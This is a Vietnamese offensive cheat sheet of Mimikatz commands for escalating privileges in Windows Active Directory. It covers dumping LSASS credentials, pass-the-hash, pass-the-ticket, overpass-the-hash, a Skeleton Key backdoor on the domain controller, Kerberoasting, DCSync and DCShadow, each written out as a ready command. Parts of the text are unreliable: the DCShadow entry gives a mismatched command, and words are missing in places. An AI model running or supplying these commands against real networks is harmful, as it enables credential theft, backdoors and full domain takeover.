```
1. Trích xuất Hashes, Passwords từ LSASS để leo thang đặc quyền
Lý do: Nếu bạn có quyền truy cập vào một tài khoản với quyền thấp trên hệ thống nhưng LSASS lưu trữ thông tin đăng nhập của tài khoản có quyền cao hơn (ví dụ: admin, domain admin).
Khai thác:
powershell


sekurlsa::logonpasswords
Tác dụng: Trích xuất mật khẩu, NTLM hash hoặc ticket Kerberos có thể giúp leo thang đặc quyền hoặc di chuyển ngang (lateral movement).
2. Pass-the-Hash (PTH) để leo thang hoặc di chuyển ngang
Lý do: Nếu bạn có hash NTLM của tài khoản có quyền cao, bạn có thể sử dụng Mimikatz để xác thực mà không cần mật khẩu thật.
Khai thác:
powershell


sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<HASH>
Tác dụng: Đăng nhập vào hệ thống với đặc quyền cao hơn.
3. Pass-the-Ticket (PTT) - Tấn công Kerberos
Lý do: Nếu bạn có vé Kerberos hợp lệ của tài khoản có quyền cao, bạn có thể sử dụng nó để truy cập tài nguyên.
Khai thác:
powershell


kerberos::ptt <ticket.kirbi>
Tác dụng: Cho phép truy cập vào dịch vụ nội bộ mà không cần mật khẩu hoặc hash.
4. Overpass-the-Hash (Pass-the-Key)
Lý do: Khi bạn có NTLM hash, thay vì sử dụng Pass-the-Hash, bạn có thể tạo vé Kerberos hợp lệ để đăng nhập.
Khai thác:
powershell


sekurlsa::pth /user:admin /domain:corp.local /ntlm:<HASH> /aes128:<AES_KEY> /aes256:<AES_KEY>
Tác dụng: Truy cập vào hệ thống Windows mà sử dụng Kerberos thay vì NTLM.
5. Skeleton Key Attack
Lý do: Khi bạn có quyền Domain Admin, bạn có thể cài một "master password" vào bộ nhớ của Domain Controller (DC), giúp bạn đăng nhập vào bất kỳ tài khoản nào.
Khai thác:
powershell


misc::skeleton
Tác dụng: Cho phép sử dụng mật khẩu mặc định để đăng nhập vào bất kỳ tài khoản nào trên hệ thống.
6. Kerberoasting - Trích xuất Service Account Hash
Lý do: Nếu một tài khoản dịch vụ (service account) có đặc quyền cao, bạn có thể trích xuất vé Kerberos của nó và crack offline.
Khai thác:
powershell


kerberos::list /export
Tác dụng: Tạo điều kiện để crack hash của tài khoản có quyền cao.
7. DCSync Attack - Đánh cắp Hash từ Domain Controller
Lý do: Nếu bạn có quyền Replicating Directory Changes, bạn có thể yêu cầu Domain Controller gửi tất cả password hashes của domain.
Khai thác:
powershell


lsadump::dcsync /user:Administrator
Tác dụng: Trích xuất NTLM hash của Domain Admin, giúp bạn kiểm soát toàn bộ hệ thống.
8. DCShadow Attack - Chèn dữ liệu độc hại vào AD
Lý do: Nếu bạn có quyền Domain Admin, bạn có thể giả mạo một Domain Controller và  thông tin trong Active Directory.
Khai thác:
powershell


misc::addsid /domain:corp.local /sid:S-1-5-21-... /id:500
Tác dụng: Thêm đặc quyền admin cho tài khoản khác mà không bị ghi log.
🔥 Tóm tắt
Kỹ thuật	Điều kiện cần	Mục tiêu
Trích xuất mật khẩu (LSASS)	Quyền SYSTEM	Lấy mật khẩu hoặc NTLM hash
Pass-the-Hash (PTH)	NTLM hash của tài khoản cao hơn	Truy cập vào hệ thống khác
Pass-the-Ticket (PTT)	Vé Kerberos	Truy cập dịch vụ nội bộ
Overpass-the-Hash (Pass-the-Key)	NTLM hash hoặc AES Key	Tạo vé Kerberos hợp lệ
Skeleton Key	Quyền Domain Admin	Cài mật khẩu backdoor vào DC
Kerberoasting	Quyền đọc vé Kerberos	Crack offline Service Account
DCSync Attack	Quyền Replication	Lấy tất cả NTLM hash của domain
DCShadow Attack	Quyền Domain Admin	 AD mà không bị log

```

[https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file](https://www.wwt.com/api-new/attachments/66a7b8da13599902a3aa53a9/file)
